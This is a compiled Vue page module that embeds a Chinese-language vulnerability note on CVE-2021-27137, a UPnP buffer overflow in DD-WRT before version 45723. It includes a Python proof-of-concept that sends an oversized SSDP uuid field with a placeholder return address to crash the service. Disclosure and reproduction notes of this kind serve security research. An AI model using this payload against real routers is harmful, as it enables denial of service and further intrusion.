import{_ as n}from"./plugin-vue_export-helper-c27b6911.js";import{o as a,c as s,e}from"./app-58e4a7d6.js";const t={},p=e(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>默认情况下，DD-WRT中的UPNP处于禁用状态，并且仅在内部网络接口上侦听。</p><p>UPNP本质上是未经身份验证的UDP形式的协议–由于无法对协议强制执行身份验证，因此它既易于使用又具有不安全。</p><p>如果DD-WRT启用了UPNP服务，则坐在存在DD-WRT设备的LAN上的远程攻击者可以通过发送一个过长的<code>uuid</code>值来触发缓冲区溢出。</p><p>根据部署DD-WRT的平台的不同，可能存在缓解措施，也可能没有缓解措施，例如ASLR等，这使得可利用性取决于安装DD-WRT的平台。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>DD-WRT &lt; 45723 版本
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>通过查看源代码，<code>ssdp.c</code>可以很容易地发现有问题的代码：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202162248612.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>用户提供的数据的未绑定副本被复制到缓冲区中，该缓冲区的大小限制为128个字节。</p><p>由于默认情况下未启用UPNP服务，因此重新创建漏洞的第一步是启用将自动启动该服务的服务</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202162248025.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>启动PoC脚本将触发upnp服务崩溃，这可以在启动以下python脚本几秒钟后看到</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202162248047.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> socket
target_ip <span class="token operator">=</span> <span class="token string">&quot;192.168.15.124&quot;</span> <span class="token comment"># IP Address of Target</span>
off <span class="token operator">=</span> <span class="token string">&quot;D&quot;</span><span class="token operator">*</span><span class="token number">164</span>
ret_addr <span class="token operator">=</span> <span class="token string">&quot;AAAA&quot;</span> 
payload <span class="token operator">=</span> off <span class="token operator">+</span> ret_addr
packet <span class="token operator">=</span> \\
    <span class="token string">&#39;M-SEARCH * HTTP/1.1\\r\\n&#39;</span> \\
    <span class="token string">&#39;HOST:239.255.255.250:1900\\r\\n&#39;</span> \\
    <span class="token string">&#39;ST:uuid:&#39;</span><span class="token operator">+</span>payload<span class="token operator">+</span><span class="token string">&#39;\\r\\n&#39;</span> \\
    <span class="token string">&#39;MX:2\\r\\n&#39;</span> \\
    <span class="token string">&#39;MAN:&quot;ssdp:discover&quot;\\r\\n&#39;</span> \\
    <span class="token string">&#39;\\r\\n&#39;</span>
s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_DGRAM<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>IPPROTO_UDP<span class="token punctuation">)</span>
s<span class="token punctuation">.</span>sendto<span class="token punctuation">(</span>packet<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>target_ip<span class="token punctuation">,</span> <span class="token number">1900</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,17),o=[p];function i(c,r){return a(),s("div",null,o)}const u=n(t,[["render",i],["__file","DD-WRT UPNP缓冲区溢出漏洞 CVE-2021-27137.html.vue"]]);export{u as default};
